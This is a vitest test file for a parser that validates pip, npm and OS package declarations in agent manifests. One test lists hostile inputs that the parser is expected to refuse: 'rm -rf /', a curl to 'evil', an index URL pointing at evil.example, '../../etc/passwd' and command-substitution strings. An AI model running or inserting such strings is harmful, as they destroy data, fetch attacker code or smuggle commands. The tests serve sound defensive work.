import { describe, expect, it } from "vitest";

import {
  canonicalExecutionEnvironmentJson,
  EXECUTION_ENVIRONMENT_INVALID_DECLARATION_KEY,
  EXECUTION_ENVIRONMENT_MAX_ENTRIES_PER_MANAGER,
  EXECUTION_ENVIRONMENT_MAX_ENTRY_LENGTH,
  isEmptyExecutionEnvironment,
  parseExecutionEnvironment,
  resolveExecutionEnvironmentClaim,
} from "../execution-environment";
import { recordFromManifest } from "../runtime-loader";

describe("parseExecutionEnvironment", () => {
  it("parses and canonicalizes a valid declaration (trim, dedupe, sort)", () => {
    const result = parseExecutionEnvironment({
      pip: [" pandas==2.2.1", "requests", "pandas==2.2.1"],
      npm: ["@scope/tool@^1.2.3", "prettier"],
      os: ["pandoc", "ffmpeg"],
    });
    expect(result).toEqual({
      ok: true,
      spec: {
        os: ["ffmpeg", "pandoc"],
        pip: ["pandas==2.2.1", "requests"],
        npm: ["@scope/tool@^1.2.3", "prettier"],
      },
    });
  });

  it("is order-insensitive: two declarations of the same set canonicalize identically", () => {
    const a = parseExecutionEnvironment({ pip: ["b", "a"], os: ["z", "y"] });
    const b = parseExecutionEnvironment({ os: ["y", "z"], pip: ["a", "b"] });
    if (!a.ok || !b.ok) throw new Error("expected ok");
    expect(canonicalExecutionEnvironmentJson(a.spec)).toBe(
      canonicalExecutionEnvironmentJson(b.spec),
    );
  });

  it("REJECTS unknown keys fail-closed (a typo must not drop packages)", () => {
    const result = parseExecutionEnvironment({ pip: ["pandas"], pipx: ["x"] });
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.errors.join(" ")).toContain('unknown key "pipx"');
  });

  it("rejects non-object roots, non-array managers, and non-string entries", () => {
    expect(parseExecutionEnvironment(null).ok).toBe(false);
    expect(parseExecutionEnvironment([]).ok).toBe(false);
    expect(parseExecutionEnvironment("pip:pandas").ok).toBe(false);
    expect(parseExecutionEnvironment({ pip: "pandas" }).ok).toBe(false);
    expect(parseExecutionEnvironment({ pip: [42] }).ok).toBe(false);
    expect(parseExecutionEnvironment({ pip: [""] }).ok).toBe(false);
  });

  it("rejects option-injection, shell metacharacters, URLs, and paths", () => {
    for (const evil of [
      "--index-url=http://evil.example",
      "pandas; rm -rf /",
      "pandas && curl evil",
      "git+https://evil.example/repo.git",
      "../../etc/passwd",
      "pkg name",
      "pkg`id`",
      "pkg$(id)",
    ]) {
      const result = parseExecutionEnvironment({ pip: [evil] });
      expect(result.ok, `pip entry should be refused: ${evil}`).toBe(false);
    }
    // npm scope slashes are allowed; other slashes are not valid names.
    expect(parseExecutionEnvironment({ npm: ["@scope/pkg@^1.0.0"] }).ok).toBe(true);
    expect(parseExecutionEnvironment({ npm: ["-g"] }).ok).toBe(false);
    expect(parseExecutionEnvironment({ os: ["pandoc=3.1.11+ds-1"] }).ok).toBe(true);
    expect(parseExecutionEnvironment({ os: ["Pandoc"] }).ok).toBe(false); // Debian names are lowercase
  });

  it("enforces entry-length and list-size bounds", () => {
    const long = "a".repeat(EXECUTION_ENVIRONMENT_MAX_ENTRY_LENGTH + 1);
    expect(parseExecutionEnvironment({ pip: [long] }).ok).toBe(false);
    const many = Array.from(
      { length: EXECUTION_ENVIRONMENT_MAX_ENTRIES_PER_MANAGER + 1 },
      (_, i) => `pkg${i}`,
    );
    expect(parseExecutionEnvironment({ pip: many }).ok).toBe(false);
  });

  it("collects every error instead of stopping at the first", () => {
    const result = parseExecutionEnvironment({ pip: ["ok", "bad one"], npm: "x" });
    expect(result.ok).toBe(false);
    if (result.ok) return;
    expect(result.errors.length).toBeGreaterThanOrEqual(2);
  });

  it("empty declarations parse to the empty spec", () => {
    const result = parseExecutionEnvironment({});
    expect(result).toEqual({ ok: true, spec: {} });
    if (result.ok) expect(isEmptyExecutionEnvironment(result.spec)).toBe(true);
    const emptyLists = parseExecutionEnvironment({ pip: [], npm: [] });
    if (!emptyLists.ok) throw new Error("expected ok");
    expect(isEmptyExecutionEnvironment(emptyLists.spec)).toBe(true);
  });
});

describe("resolveExecutionEnvironmentClaim (carrier-kind gate)", () => {
  const env = { pip: ["pandas"] };

  it("carries the raw claim for kind:agent only", () => {
    expect(resolveExecutionEnvironmentClaim("agent", { execution: { environment: env } })).toEqual(env);
    for (const kind of ["connector", "artifact", "skill", "workflow", undefined]) {
      expect(
        resolveExecutionEnvironmentClaim(kind, { execution: { environment: env } }),
      ).toBeNull();
    }
  });

  it("resolves null ONLY for genuinely absent declarations", () => {
    expect(resolveExecutionEnvironmentClaim("agent", {})).toBeNull();
    expect(resolveExecutionEnvironmentClaim("agent", { execution: undefined })).toBeNull();
    expect(resolveExecutionEnvironmentClaim("agent", { execution: {} })).toBeNull();
    expect(
      resolveExecutionEnvironmentClaim("agent", { execution: { environment: undefined } }),
    ).toBeNull();
  });

  it("carries the POISON marker for PRESENT-but-malformed declarations (never silent none)", () => {
    const poison = { [EXECUTION_ENVIRONMENT_INVALID_DECLARATION_KEY]: true };
    expect(resolveExecutionEnvironmentClaim("agent", { execution: null })).toEqual(poison);
    expect(resolveExecutionEnvironmentClaim("agent", { execution: [] })).toEqual(poison);
    expect(resolveExecutionEnvironmentClaim("agent", { execution: "pip" })).toEqual(poison);
    expect(
      resolveExecutionEnvironmentClaim("agent", { execution: { environment: [] } }),
    ).toEqual(poison);
    expect(
      resolveExecutionEnvironmentClaim("agent", { execution: { environment: "pip" } }),
    ).toEqual(poison);
    expect(
      resolveExecutionEnvironmentClaim("agent", { execution: { environment: null } }),
    ).toEqual(poison);
    // The parser rejects the marker with a precise error — the declaration
    // attempt fails LOUDLY at consumption.
    const parsed = parseExecutionEnvironment(poison);
    expect(parsed.ok).toBe(false);
    if (!parsed.ok) expect(parsed.errors[0]).toContain("DECLARED but is not a plain object");
  });

  it("content is NOT validated at the claim resolver — a malformed-but-object claim is carried", () => {
    expect(
      resolveExecutionEnvironmentClaim("agent", { execution: { environment: { bogus: true } } }),
    ).toEqual({ bogus: true });
  });
});

describe("recordFromManifest executionEnvironment carry (runtime loader path)", () => {
  const manifest = (cinatra: Record<string, unknown>): string =>
    JSON.stringify({ name: "@cinatra-ai/x-agent", cinatra });

  it("carries the raw claim for an agent manifest", () => {
    const rec = recordFromManifest(
      "/store/x",
      manifest({ kind: "agent", execution: { environment: { pip: ["pandas"] } } }),
    );
    expect(rec?.executionEnvironment).toEqual({ pip: ["pandas"] });
  });

  it("drops a non-agent (or absent) claim — both loader paths agree", () => {
    const connector = recordFromManifest(
      "/store/x",
      manifest({ kind: "connector", execution: { environment: { pip: ["pandas"] } } }),
    );
    expect(connector?.executionEnvironment).toBeUndefined();
    const none = recordFromManifest("/store/x", manifest({ kind: "agent" }));
    expect(none?.executionEnvironment).toBeUndefined();
  });
});
